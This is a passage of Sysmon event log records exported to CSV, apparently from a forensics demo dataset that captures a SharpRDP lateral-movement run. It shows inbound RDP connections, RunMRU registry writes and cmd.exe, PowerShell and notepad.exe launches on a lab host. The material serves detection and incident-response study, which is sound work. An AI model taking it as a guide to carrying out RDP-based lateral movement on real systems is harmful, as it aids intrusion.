SERVICE""},{""@Name"":""Protocol"",""#text"":""tcp""},{""@Name"":""Initiated"",""#text"":""False""},{""@Name"":""SourceIsIpv6"",""#text"":""False""},{""@Name"":""SourceIp"",""#text"":""192.168.56.1""},{""@Name"":""SourceHostname"",""#text"":""LAPTOP-JU4M3I0E""},{""@Name"":""SourcePort"",""#text"":""52546""},{""@Name"":""SourcePortName""},{""@Name"":""DestinationIsIpv6"",""#text"":""False""},{""@Name"":""DestinationIp"",""#text"":""192.168.56.101""},{""@Name"":""DestinationHostname"",""#text"":""MSEDGEWIN10""},{""@Name"":""DestinationPort"",""#text"":""3389""},{""@Name"":""DestinationPortName"",""#text"":""ms-wbt-server""}]}}"
15,311363,2020-07-09 22:00:42.9192085,12,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3280,1044,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Object create and delete),,,"ProcessID: 2356, ProcessGUID: 747f3d96-86fc-5f07-0000-00101e4b0700","RuleName: ",Image: C:\Windows\Explorer.EXE,EventType: CreateKey,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""CreateKey""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:00:42.907""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-86fc-5f07-0000-00101e4b0700""},{""@Name"":""ProcessId"",""#text"":""2356""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU""}]}}"
16,311364,2020-07-09 22:00:43.0428496,12,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3280,1044,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Object create and delete),,,"ProcessID: 2356, ProcessGUID: 747f3d96-86fc-5f07-0000-00101e4b0700","RuleName: ",Image: C:\Windows\Explorer.EXE,EventType: CreateKey,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""CreateKey""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:00:43.016""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-86fc-5f07-0000-00101e4b0700""},{""@Name"":""ProcessId"",""#text"":""2356""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU""}]}}"
17,311365,2020-07-09 22:00:45.5899227,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3280,1044,MSEDGEWIN10,0,S-1-5-18,Process creation,MSEDGEWIN10\IEUser,,"ProcessID: 7976, ProcessGUID: 747f3d96-938d-5f07-0000-001043a84500","RuleName: ","SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18",ParentProcess: C:\Windows\explorer.exe,"ParentProcessID: 2356, ParentProcessGUID: 747f3d96-86fc-5f07-0000-00101e4b0700",ParentCommandLine: C:\Windows\Explorer.EXE,"""C:\Windows\system32\cmd.exe"" ",False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:00:45.576""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-938d-5f07-0000-001043a84500""},{""@Name"":""ProcessId"",""#text"":""7976""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.17763.592 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""Windows Command Processor""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""Cmd.Exe""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Windows\\system32\\cmd.exe\"" ""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Users\\IEUser\\""},{""@Name"":""User"",""#text"":""MSEDGEWIN10\\IEUser""},{""@Name"":""LogonGuid"",""#text"":""747f3d96-86fa-5f07-0000-00204a8b0600""},{""@Name"":""LogonId"",""#text"":""0x68B4A""},{""@Name"":""TerminalSessionId"",""#text"":""2""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18""},{""@Name"":""ParentProcessGuid"",""#text"":""747f3d96-86fc-5f07-0000-00101e4b0700""},{""@Name"":""ParentProcessId"",""#text"":""2356""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\explorer.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\Explorer.EXE""}]}}"
18,311366,2020-07-09 22:00:45.5904485,12,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3280,1044,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Object create and delete),,,"ProcessID: 2356, ProcessGUID: 747f3d96-86fc-5f07-0000-00101e4b0700","RuleName: ",Image: C:\Windows\Explorer.EXE,EventType: CreateKey,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""CreateKey""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:00:45.579""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-86fc-5f07-0000-00101e4b0700""},{""@Name"":""ProcessId"",""#text"":""2356""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU""}]}}"
19,311367,2020-07-09 22:00:45.5905894,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3280,1044,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Value Set),,,"ProcessID: 2356, ProcessGUID: 747f3d96-86fc-5f07-0000-00101e4b0700","RuleName: ",Image: C:\Windows\Explorer.EXE,EventType: SetValue,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\b,Details: cmd.exe\1,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:00:45.579""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-86fc-5f07-0000-00101e4b0700""},{""@Name"":""ProcessId"",""#text"":""2356""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\b""},{""@Name"":""Details"",""#text"":""cmd.exe\\1""}]}}"
20,311368,2020-07-09 22:00:45.5907363,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3280,1044,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Value Set),,,"ProcessID: 2356, ProcessGUID: 747f3d96-86fc-5f07-0000-00101e4b0700","RuleName: ",Image: C:\Windows\Explorer.EXE,EventType: SetValue,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\MRUList,Details: ba,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:00:45.579""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-86fc-5f07-0000-00101e4b0700""},{""@Name"":""ProcessId"",""#text"":""2356""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\MRUList""},{""@Name"":""Details"",""#text"":""ba""}]}}"
21,311369,2020-07-09 22:00:48.1052262,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3280,1044,MSEDGEWIN10,0,S-1-5-18,Process creation,MSEDGEWIN10\IEUser,,"ProcessID: 8032, ProcessGUID: 747f3d96-9390-5f07-0000-00105cbc4500","RuleName: ","SHA1=B6D237154F2E528F0B503B58B025862D66B02B73,MD5=0E61079D3283687D2E279272966AE99D,SHA256=A92056D772260B39A876D01552496B2F8B4610A0B1E084952FE1176784E2CE77,IMPHASH=C8922BE3DCDFEB5994C9EEE7745DC22E",ParentProcess: C:\Windows\System32\cmd.exe,"ParentProcessID: 7976, ParentProcessGUID: 747f3d96-938d-5f07-0000-001043a84500","ParentCommandLine: ""C:\Windows\system32\cmd.exe"" ",c:\windows\system32\notepad.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:00:48.095""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-9390-5f07-0000-00105cbc4500""},{""@Name"":""ProcessId"",""#text"":""8032""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\notepad.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.17763.475 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""Notepad""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""NOTEPAD.EXE""},{""@Name"":""CommandLine"",""#text"":""c:\\windows\\system32\\notepad.exe""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Users\\IEUser\\""},{""@Name"":""User"",""#text"":""MSEDGEWIN10\\IEUser""},{""@Name"":""LogonGuid"",""#text"":""747f3d96-86fa-5f07-0000-00204a8b0600""},{""@Name"":""LogonId"",""#text"":""0x68B4A""},{""@Name"":""TerminalSessionId"",""#text"":""2""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""SHA1=B6D237154F2E528F0B503B58B025862D66B02B73,MD5=0E61079D3283687D2E279272966AE99D,SHA256=A92056D772260B39A876D01552496B2F8B4610A0B1E084952FE1176784E2CE77,IMPHASH=C8922BE3DCDFEB5994C9EEE7745DC22E""},{""@Name"":""ParentProcessGuid"",""#text"":""747f3d96-938d-5f07-0000-001043a84500""},{""@Name"":""ParentProcessId"",""#text"":""7976""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""ParentCommandLine"",""#text"":""\""C:\\Windows\\system32\\cmd.exe\"" ""}]}}"
22,311370,2020-07-09 22:00:58.5504375,3,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3280,3892,MSEDGEWIN10,0,S-1-5-18,Network connection,NT AUTHORITY\NETWORK SERVICE,,"ProcessID: 428, ProcessGUID: 747f3d96-85f1-5f07-0000-001074cb0000","RuleName: ",SourceHostname: LAPTOP-JU4M3I0E,SourceIp: 192.168.56.1,DestinationHostname: MSEDGEWIN10,DestinationIp: 192.168.56.101,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:00:57.196""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-85f1-5f07-0000-001074cb0000""},{""@Name"":""ProcessId"",""#text"":""428""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\svchost.exe""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\NETWORK SERVICE""},{""@Name"":""Protocol"",""#text"":""tcp""},{""@Name"":""Initiated"",""#text"":""False""},{""@Name"":""SourceIsIpv6"",""#text"":""False""},{""@Name"":""SourceIp"",""#text"":""192.168.56.1""},{""@Name"":""SourceHostname"",""#text"":""LAPTOP-JU4M3I0E""},{""@Name"":""SourcePort"",""#text"":""52547""},{""@Name"":""SourcePortName""},{""@Name"":""DestinationIsIpv6"",""#text"":""False""},{""@Name"":""DestinationIp"",""#text"":""192.168.56.101""},{""@Name"":""DestinationHostname"",""#text"":""MSEDGEWIN10""},{""@Name"":""DestinationPort"",""#text"":""3389""},{""@Name"":""DestinationPortName"",""#text"":""ms-wbt-server""}]}}"
23,311371,2020-07-09 22:01:01.1543827,12,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3280,1044,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Object create and delete),,,"ProcessID: 2356, ProcessGUID: 747f3d96-86fc-5f07-0000-00101e4b0700","RuleName: ",Image: C:\Windows\Explorer.EXE,EventType: CreateKey,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""CreateKey""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:01:01.142""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-86fc-5f07-0000-00101e4b0700""},{""@Name"":""ProcessId"",""#text"":""2356""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU""}]}}"
24,311372,2020-07-09 22:01:01.3374064,12,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3280,1044,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Object create and delete),,,"ProcessID: 2356, ProcessGUID: 747f3d96-86fc-5f07-0000-00101e4b0700","RuleName: ",Image: C:\Windows\Explorer.EXE,EventType: CreateKey,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""CreateKey""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:01:01.314""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-86fc-5f07-0000-00101e4b0700""},{""@Name"":""ProcessId"",""#text"":""2356""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU""}]}}"
25,311373,2020-07-09 22:01:03.8985706,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3280,1044,MSEDGEWIN10,0,S-1-5-18,Process creation,MSEDGEWIN10\IEUser,,"ProcessID: 7456, ProcessGUID: 747f3d96-939f-5f07-0000-0010888e4600","RuleName: ","SHA1=6CBCE4A295C163791B60FC23D285E6D84F28EE4C,MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F",ParentProcess: C:\Windows\explorer.exe,"ParentProcessID: 2356, ParentProcessGUID: 747f3d96-86fc-5f07-0000-00101e4b0700",ParentCommandLine: C:\Windows\Explorer.EXE,"""C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe"" ",False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:01:03.894""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-939f-5f07-0000-0010888e4600""},{""@Name"":""ProcessId"",""#text"":""7456""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.17763.1 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""Windows PowerShell""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""PowerShell.EXE""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe\"" ""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Users\\IEUser\\""},{""@Name"":""User"",""#text"":""MSEDGEWIN10\\IEUser""},{""@Name"":""LogonGuid"",""#text"":""747f3d96-86fa-5f07-0000-00204a8b0600""},{""@Name"":""LogonId"",""#text"":""0x68B4A""},{""@Name"":""TerminalSessionId"",""#text"":""2""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""SHA1=6CBCE4A295C163791B60FC23D285E6D84F28EE4C,MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F""},{""@Name"":""ParentProcessGuid"",""#text"":""747f3d96-86fc-5f07-0000-00101e4b0700""},{""@Name"":""ParentProcessId"",""#text"":""2356""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\explorer.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\Explorer.EXE""}]}}"
26,311374,2020-07-09 22:01:03.8992406,12,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3280,1044,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Object create and delete),,,"ProcessID: 2356, ProcessGUID: 747f3d96-86fc-5f07-0000-00101e4b0700","RuleName: ",Image: C:\Windows\Explorer.EXE,EventType: CreateKey,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""CreateKey""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:01:03.893""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-86fc-5f07-0000-00101e4b0700""},{""@Name"":""ProcessId"",""#text"":""2356""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU""}]}}"
27,311375,2020-07-09 22:01:03.9004337,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3280,1044,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Value Set),,,"ProcessID: 2356, ProcessGUID: 747f3d96-86fc-5f07-0000-00101e4b0700","RuleName: ",Image: C:\Windows\Explorer.EXE,EventType: SetValue,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\c,Details: powershell.exe\1,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:01:03.893""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-86fc-5f07-0000-00101e4b0700""},{""@Name"":""ProcessId"",""#text"":""2356""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\c""},{""@Name"":""Details"",""#text"":""powershell.exe\\1""}]}}"
28,311376,2020-07-09 22:01:03.9022599,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3280,1044,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Value Set),,,"ProcessID: 2356, ProcessGUID: 747f3d96-86fc-5f07-0000-00101e4b0700","RuleName: ",Image: C:\Windows\Explorer.EXE,EventType: SetValue,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\MRUList,Details: cba,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:01:03.893""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-86fc-5f07-0000-00101e4b0700""},{""@Name"":""ProcessId"",""#text"":""2356""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\MRUList""},{""@Name"":""Details"",""#text"":""cba""}]}}"
29,311377,2020-07-09 22:01:06.4277230,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3280,1044,MSEDGEWIN10,0,S-1-5-18,Process creation,MSEDGEWIN10\IEUser,,"ProcessID: 7200, ProcessGUID: 747f3d96-93a2-5f07-0000-00108ec54600","RuleName: ","SHA1=B6D237154F2E528F0B503B58B025862D66B02B73,MD5=0E61079D3283687D2E279272966AE99D,SHA256=A92056D772260B39A876D01552496B2F8B4610A0B1E084952FE1176784E2CE77,IMPHASH=C8922BE3DCDFEB5994C9EEE7745DC22E",ParentProcess: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"ParentProcessID: 7456, ParentProcessGUID: 747f3d96-939f-5f07-0000-0010888e4600","ParentCommandLine: ""C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe"" ","""C:\windows\system32\notepad.exe""",False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:01:06.422""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-93a2-5f07-0000-00108ec54600""},{""@Name"":""ProcessId"",""#text"":""7200""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\notepad.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.17763.475 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""Notepad""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""NOTEPAD.EXE""},{""@Name"":""CommandLine"",""#text"":""\""C:\\windows\\system32\\notepad.exe\""""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Users\\IEUser\\""},{""@Name"":""User"",""#text"":""MSEDGEWIN10\\IEUser""},{""@Name"":""LogonGuid"",""#text"":""747f3d96-86fa-5f07-0000-00204a8b0600""},{""@Name"":""LogonId"",""#text"":""0x68B4A""},{""@Name"":""TerminalSessionId"",""#text"":""2""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""SHA1=B6D237154F2E528F0B503B58B025862D66B02B73,MD5=0E61079D3283687D2E279272966AE99D,SHA256=A92056D772260B39A876D01552496B2F8B4610A0B1E084952FE1176784E2CE77,IMPHASH=C8922BE3DCDFEB5994C9EEE7745DC22E""},{""@Name"":""ParentProcessGuid"",""#text"":""747f3d96-939f-5f07-0000-0010888e4600""},{""@Name"":""ParentProcessId"",""#text"":""7456""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""},{""@Name"":""ParentCommandLine"",""#text"":""\""C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe\"" ""}]}}"
30,311378,2020-07-09 22:02:42.0856432,12,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3280,1044,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Object create and delete),,,"ProcessID: 2284, ProcessGUID: 747f3d96-911a-5f07-0000-001087c73500","RuleName: ",Image: C:\Windows\system32\mmc.exe,EventType: CreateKey,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""CreateKey""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:02:42.078""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-911a-5f07-0000-001087c73500""},{""@Name"":""ProcessId"",""#text"":""2284""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\mmc.exe""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU""}]}}"
31,311382,2020-07-09 22:05:58.3739611,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3148,4088,MSEDGEWIN10,0,S-1-5-18,Process creation,NT AUTHORITY\SYSTEM,,"ProcessID: 3096, ProcessGUID: 747f3d96-94c3-5f07-0000-001080b40100","RuleName: ","SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18",ParentProcess: ?,"ParentProcessID: 628, ParentProcessGUID: 00000000-0000-0000-0000-000000000000",ParentCommandLine: ?,cmd.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:05:55.880""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-94c3-5f07-0000-001080b40100""},{""@Name"":""ProcessId"",""#text"":""3096""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.17763.592 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""Windows Command Processor""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""Cmd.Exe""},{""@Name"":""CommandLine"",""#text"":""cmd.exe""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""NT 